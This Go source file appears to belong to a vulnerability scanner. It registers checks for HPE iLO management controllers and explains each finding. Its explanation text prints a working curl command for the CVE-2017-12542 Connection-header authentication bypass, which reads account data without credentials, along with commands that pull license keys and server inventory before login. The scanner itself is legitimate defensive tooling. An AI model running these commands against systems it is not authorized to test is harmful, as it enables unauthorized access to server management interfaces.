package check

import (
	"context"
	"fmt"
	"strings"

	"github.com/runZeroInc/oobscan/pkg/engine"
	"github.com/runZeroInc/oobscan/pkg/httpx"
	"github.com/runZeroInc/oobscan/pkg/ilo"
)

func init() {
	Register(Check{
		Name:        "http.ilo.authBypass",
		Description: "HPE iLO4 Connection-header authentication bypass (CVE-2017-12542), actively confirmed",
		Category:    "creds",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runILOAuthBypass,
	})
	Register(Check{
		Name:        "http.ilo.licenseKey",
		Description: "HPE iLO pre-auth license-key disclosure via /xmldata?item=CpqKey",
		Category:    "http",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runILOLicenseKey,
	})
	Register(Check{
		Name:        "http.ilo.xmlData",
		Description: "HPE iLO pre-auth inventory disclosure via /xmldata?item=all (product, serial, UUID, NIC MAC/IP)",
		Category:    "http",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runILOXMLData,
	})
	Register(Check{
		Name:        "http.ilo.knownCVEs",
		Description: "HPE iLO version-gated known CVE fallback from pre-auth /xmldata firmware evidence",
		Category:    "vuln",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     false,
		Run:         runILOKnownCVEs,
	})
}

type webEndpoint struct {
	port   int
	scheme string
}

type iloSurfaceRead struct {
	data   *ilo.XMLData
	port   int
	scheme string
}

const iloSurfaceEvidenceKey = "iloSurfaceRead"

func iloSurface(t *engine.Target) *iloSurfaceRead {
	if t == nil {
		return nil
	}
	if v, ok := t.Evidenced(iloSurfaceEvidenceKey); ok {
		r, _ := v.(*iloSurfaceRead)
		return r
	}
	r := iloReadSurface(t)
	if !t.SetEvidenceIfAbsent(iloSurfaceEvidenceKey, r) {
		if v, ok := t.Evidenced(iloSurfaceEvidenceKey); ok {
			r, _ = v.(*iloSurfaceRead)
		}
	}
	return r
}

func iloReadSurface(t *engine.Target) *iloSurfaceRead {
	if x := iloEvidenceXMLData(t); x != nil {
		return &iloSurfaceRead{data: x, port: webPort(t), scheme: webProto(t)}
	}
	if !isILOTarget(t) {
		return nil
	}

	client := httpx.NewClient(httpx.ClientOptions{
		Timeout:      httpSurfaceCanaryTimeout(t),
		PhaseCeiling: httpSurfaceCanaryTimeout(t),
	})
	for _, ep := range iloSurfaceEndpoints(t) {
		var httpsPorts, httpPorts []int
		if ep.scheme == "http" {
			httpPorts = []int{ep.port}
		} else {
			httpsPorts = []int{ep.port}
		}
		x, err := ilo.FetchPorts(client, t.Host, httpsPorts, httpPorts)

		if err != nil || x == nil || !x.Populated() {
			continue
		}
		t.SetEvidence("ilo", x)
		return &iloSurfaceRead{data: x, port: ep.port, scheme: ep.scheme}
	}
	return nil
}

func iloEvidenceXMLData(t *engine.Target) *ilo.XMLData {
	v, ok := t.Evidenced("ilo")
	if !ok {
		return nil
	}
	x, _ := v.(*ilo.XMLData)
	if x == nil || !x.Populated() {
		return nil
	}
	return x
}

func iloSurfaceEndpoints(t *engine.Target) []webEndpoint {
	out := []webEndpoint{{port: webPort(t), scheme: webProto(t)}}
	if out[0].port == 80 {
		return out
	}
	for _, p := range t.Ports {
		if p.Proto == engine.ProtoTCP && p.Num == 80 {
			out = append(out, webEndpoint{port: 80, scheme: "http"})
			break
		}
	}
	return out
}

func runILOLicenseKey(ctx context.Context, t *engine.Target) []engine.Finding {
	if !isILOTarget(t) {
		return nil
	}

	lk, ok := ilo.FetchLicenseKey(t.Host, t.Timeout)
	if !ok {
		return nil
	}
	return []engine.Finding{{
		Check: "http.ilo.licenseKey", Category: "http", Risk: "medium",
		Port: lk.Port, Transport: "tcp", Protocol: lk.Scheme,
		Fields: engine.F(
			"url", "/xmldata?item=CpqKey",
			"license", lk.Name,
			"proof", fmt.Sprintf("key=%s", lk.Key)),
	}}
}

func runILOXMLData(ctx context.Context, t *engine.Target) []engine.Finding {
	r := iloSurface(t)
	if r == nil {
		return nil
	}
	x := r.data
	uuid := x.HSI.UUID
	if uuid == "" {
		uuid = x.HSI.CUUID
	}

	fields := engine.F(
		"url", "/xmldata?item=all",
		"product", strings.TrimSpace(x.HSI.SPN),
		"part", strings.TrimSpace(x.HSI.PN),
		"serial", strings.TrimSpace(x.HSI.SBSN),
		"uuid", strings.TrimSpace(uuid),
		"ilo_fw", strings.TrimSpace(x.MP.FWRI),
		"ilo_serial", strings.TrimSpace(x.MP.SN),
		"nics", strings.Join(x.MACIPs(), "; "),
	)

	if len(fields) <= 1 {
		return nil
	}
	return []engine.Finding{{
		Check: "http.ilo.xmlData", Category: "http", Risk: "low",
		Port: r.port, Transport: "tcp", Protocol: r.scheme,
		Fields: fields,
	}}
}

func runILOAuthBypass(ctx context.Context, t *engine.Target) []engine.Finding {
	if t.DisableLogins {
		return nil
	}

	if !isILO4(t) {
		r := iloSurface(t)
		if r == nil || r.data.Generation() != "iLO4" {
			return nil
		}
	}
	ok, evidence, err := ilo.VerifyAuthBypass(t.Host, t.Timeout)
	if err != nil || !ok {
		return nil
	}
	return []engine.Finding{{
		Check: "http.ilo.authBypass", Category: "creds", Risk: "critical",
		Port: 443, Transport: "tcp", Protocol: "redfish",
		Fields: engine.F("proof", evidence),
		CVE:    []string{"CVE-2017-12542"},
	}}
}

func runILOKnownCVEs(ctx context.Context, t *engine.Target) []engine.Finding {
	_ = ctx
	r := iloSurface(t)
	if r == nil {
		return nil
	}
	x := r.data
	gen := strings.TrimSpace(x.Generation())
	fw := strings.TrimSpace(x.MP.FWRI)
	if gen == "" || fw == "" {
		return nil
	}
	ms := ilo.MatchCVEs(gen, fw)
	if len(ms) == 0 {
		return nil
	}
	out := make([]engine.Finding, 0, len(ms))
	for _, c := range ms {
		f := engine.F(
			"generation", gen,
			"firmware", fw,
			"fixed_in", c.FixedIn,
			"title", c.Title,
			"proof", proofKV("generation", gen, "firmwareVersion", fw, "fixedIn", c.FixedIn),
		)
		if c.AuthBypass {
			f = append(f, engine.Field{Key: "auth_bypass", Val: "true"})
		}
		out = append(out, engine.Finding{
			Check:     "http.ilo.knownCVEs",
			Category:  "vuln",
			Risk:      iloSeverityRisk(c.Severity),
			Port:      r.port,
			Transport: "tcp",
			Protocol:  r.scheme,
			Fields:    f,
			CVE:       []string{c.ID},
		})
	}
	return out
}

func iloSeverityRisk(sev string) string {
	switch strings.ToLower(strings.TrimSpace(sev)) {
	case "critical":
		return "critical"
	case "high":
		return "high"
	case "medium":
		return "medium"
	default:
		return "low"
	}
}

func isILO4(t *engine.Target) bool {
	if v, ok := t.Evidenced("ilo"); ok {
		if x, ok := v.(*ilo.XMLData); ok && x != nil && x.Generation() == "iLO4" {
			return true
		}
	}
	if t.Identity == nil {
		return false
	}
	return strings.Contains(t.Identity.Product, "iLO4") || t.Identity.Generation == "iLO4"
}

func isILOTarget(t *engine.Target) bool {
	if t == nil {
		return false
	}
	if _, ok := t.Evidenced("ilo"); ok {
		return true
	}
	if t.Identity == nil || !strings.EqualFold(t.Identity.Vendor, "hpe") {
		return false
	}
	return t.Identity.Class == engine.ClassBMC ||
		strings.Contains(strings.ToLower(t.Identity.Product+" "+t.Identity.Generation), "ilo")
}

func init() {
	RegisterExplain("http.ilo.authBypass", explainILOAuthBypass)
	RegisterExplain("http.ilo.licenseKey", explainILOLicenseKey)
	RegisterExplain("http.ilo.xmlData", explainILOXMLData)
	RegisterExplain("http.ilo.knownCVEs", explainILOKnownCVEs)
}

func explainILOAuthBypass(host string, f engine.Finding) string {
	evidence := explainField(f, "proof")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nHPE iLO4 firmware < 2.53 skips auth when the HTTP `Connection` header is\n")
	b.WriteString("padded to exactly 29 bytes (CVE-2017-12542). A single crafted GET reads any\n")
	b.WriteString("REST resource without credentials.\n")
	if evidence != "" {
		b.WriteString(fmt.Sprintf("\n**Proof:** `%s`\n", evidence))
	}
	b.WriteString("\n**Validate:**\n")
	b.WriteString(explainSh(
		`curl -sk -H "Connection: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \`,
		fmt.Sprintf(`  https://%s/rest/v1/AccountService/Accounts | python3 -m json.tool`, host),
	))
	b.WriteString("\n\n**CVE:** CVE-2017-12542\n")
	return b.String()
}

func explainILOLicenseKey(host string, f engine.Finding) string {
	license := explainField(f, "license")
	proof := explainField(f, "proof")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nHPE iLO `/xmldata?item=CpqKey` returns the activation license key without auth.\n")
	if license != "" {
		b.WriteString(fmt.Sprintf("\n**License:** `%s`  **Key:** `%s`\n", license, proof))
	}
	b.WriteString("\n**Retrieve:**\n")
	b.WriteString(explainSh(fmt.Sprintf("curl -sk 'https://%s/xmldata?item=CpqKey'", host)))
	return b.String()
}

func explainILOXMLData(host string, f engine.Finding) string {
	serial := explainField(f, "serial")
	product := explainField(f, "product")
	nics := explainField(f, "nics")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nHPE iLO `/xmldata?item=all` returns full server inventory (product, serial,\n")
	b.WriteString("UUID, iLO firmware, NIC MAC/IP) without authentication.\n")
	if product != "" {
		b.WriteString(fmt.Sprintf("\n**Product:** `%s`  **Serial:** `%s`\n", product, serial))
	}
	if nics != "" {
		b.WriteString(fmt.Sprintf("**NICs:** `%s`\n", nics))
	}
	b.WriteString("\n**Retrieve:**\n")
	b.WriteString(explainSh(fmt.Sprintf("curl -sk 'https://%s/xmldata?item=all'", host)))
	return b.String()
}

func explainILOKnownCVEs(host string, f engine.Finding) string {
	gen := explainField(f, "generation")
	fw := explainField(f, "firmware")
	fixed := explainField(f, "fixed_in")
	title := explainField(f, "title")
	cve := ""
	if len(f.CVE) > 0 {
		cve = f.CVE[0]
	}
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nFallback version-gated CVE mapping from pre-auth `/xmldata?item=all` firmware evidence.\n")
	if cve != "" || title != "" {
		b.WriteString(fmt.Sprintf("\n**CVE:** `%s`  **Issue:** `%s`\n", cve, title))
	}
	b.WriteString(fmt.Sprintf("**Observed:** `%s %s`  **Fixed in:** `%s`\n", gen, fw, fixed))
	b.WriteString("\n**Evidence source:**\n")
	b.WriteString(explainSh(fmt.Sprintf("curl -sk 'https://%s/xmldata?item=all'", host)))
	return b.String()
}
